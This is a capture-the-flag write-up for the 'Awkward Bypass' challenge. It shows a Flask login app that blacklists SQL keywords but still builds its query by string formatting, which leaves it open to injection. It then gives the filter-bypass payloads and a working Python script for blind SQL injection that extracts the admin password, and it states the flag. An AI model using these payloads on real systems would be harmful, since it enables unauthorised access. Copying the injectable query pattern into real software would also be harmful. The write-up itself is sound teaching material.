# Awkward Bypass

## Task

```python
import re
import sqlite3
from flask import Flask, render_template, url_for, request, redirect, make_response

app = Flask(__name__)

blacklist = ["ABORT", "ACTION", "ADD", "AFTER", "ALL", "ALTER", "ALWAYS", "ANALYZE", "AND", "AS", "ASC", "ATTACH", "AUTOINCREMENT", "BEFORE", "BEGIN", "BETWEEN", "CASCADE", "CASE", "CAST", "CHECK", "COLLATE", "COLUMN", "COMMIT", "CONFLICT", "CONSTRAINT", "CREATE", "CROSS", "CURRENT", "CURRENT_DATE", "CURRENT_TIME", "CURRENT_TIMESTAMP", "DATABASE", "DEFAULT", "DEFERRABLE", "DEFERRED", "DELETE", "DESC", "DETACH", "DISTINCT", "DO", "DROP", "EACH", "ELSE", "END", "ESCAPE", "EXCEPT", "EXCLUDE", "EXCLUSIVE", "EXISTS", "EXPLAIN", "FAIL", "FILTER", "FIRST", "FOLLOWING", "FOR", "FOREIGN", "FROM", "FULL", "GENERATED", "GLOB", "GROUP", "GROUPS", "HAVING", "IF", "IGNORE", "IMMEDIATE", "IN", "INDEX", "INDEXED", "INITIALLY", "INNER", "INSERT", "INSTEAD", "INTERSECT", "INTO", "IS", "ISNULL", "JOIN", "KEY", "LAST", "LEFT", "LIKE", "LIMIT", "MATCH", "MATERIALIZED", "NATURAL", "NO", "NOT", "NOTHING", "NOTNULL", "NULL", "NULLS", "OF", "OFFSET", "ON", "OR", "ORDER", "OTHERS", "OUTER", "OVER", "PARTITION", "PLAN", "PRAGMA", "PRECEDING", "PRIMARY", "QUERY", "RAISE", "RANGE", "RECURSIVE", "REFERENCES", "REGEXP", "REINDEX", "RELEASE", "RENAME", "REPLACE", "RESTRICT", "RETURNING", "RIGHT", "ROLLBACK", "ROW", "ROWS", "SAVEPOINT", "SELECT", "SET", "TABLE", "TEMP", "TEMPORARY", "THEN", "TIES", "TO", "TRANSACTION", "TRIGGER", "UNBOUNDED", "UNION", "UNIQUE", "UPDATE", "USING", "VACUUM", "VALUES", "VIEW", "VIRTUAL", "WHEN", "WHERE", "WINDOW", "WITH", "WITHOUT"] 

def checkCreds(username, password):
	con = sqlite3.connect('database.db')
	cur = con.cursor()
	for n in blacklist:
		regex = re.compile(n, re.IGNORECASE)
		username = regex.sub("", username)
	for n in blacklist:
		regex = re.compile(n, re.IGNORECASE)
		password = regex.sub("", password)
	print(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")		
	try:
		content = cur.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'").fetchall()
	except:
		return False
	cur.close()
	con.close()
	if content == []:
		return False
	else:
		return True

@app.route('/')
def index():
	return render_template("index.html")

@app.route('/user', methods=['POST'])
def user():
	if request.method == 'POST': 
		username = request.values['username']
		password = request.values['password']
		if checkCreds(username, password) == True:
			return render_template("user.html")
		else:
			return "Error"
	else:
		return render_template("user.html")
```

## Solution

We have a long blacklist, but when we look closely, we see
that the words in the blacklist are removed, one after the other.
So if we put in something like `IWITHN` then we don't have any matches
until the `WITH` and at that point we remove it and get `IN`.
So first of all, we need to make sure that we get the login name
correctly, which of course is admin, the only problem being that contains
the word `in` which is blacklisted, thus we need to do actually log in
as `admiWITHn` (Capitalization doesn't matter, just to visualize what I'm doing)

Then we can craft our password to be `' OR 0=0--` which just becomes
`' OWITHR 0=0--` and we get...

`Ummmmmmm, did you expect a flag to be here?`

oh damn, so we need to get the password of the admin user,
not hard to do, just a little bit of python scripting to
check each character one by one using the LIKE keyword and
splitting the payload where necessary with the `WITH` keyword, as
that is the last in the list.

```python
from requests import post
import string

expl = "' OWITHR paWITHsswoWITHrd LIWITHKE '{}%"
curflag = ""

remo = "https://awkward-bypass.chal.imaginaryctf.org"
#remo = "http://localhost:5000"

while True:
    for i in "}"+string.printable:
        if i == "%" or i == "#":
            continue
        x = post(f"{remo}/user",
                data={
                    "username": "admiWITHn",
                    "password": expl.format("WITH".join(curflag+i))})
        print(expl.format("".join(curflag+i)))
        print(x.request.body)
        #print(x.text)
        if "Ummmmmmm" in x.text:
            print(i)
            curflag += i
            print(curflag)
            if i == "}":
                exit(0)
            break
        else:
            print(f"NOPE {i}")
```

as you see, the payload is just `' OWITHR paWITHsswoWITHrd LIWITHKE '{}%`,
which is just `' OR password LIKE '{}%`. The `%` just means match any suffix.
So whatever we put in there is checked and if we log in successfully, we know
we got the correct character. We just need to make sure the password we're
checking is actually what we want to check, so I just sent each character and then
a WITH and then the next character, ... This is to ensure that if we get a
`i` in the flag that we don't try to check the password `...if` which gets
reduced to the password we already know works (without the i) and falsely assuming
we found the next character to be `f` but in actually regressing to the 
previous password.

We get the admin password to be:

`ictf{n1c3_fil73r_byp@ss_7130676d}`
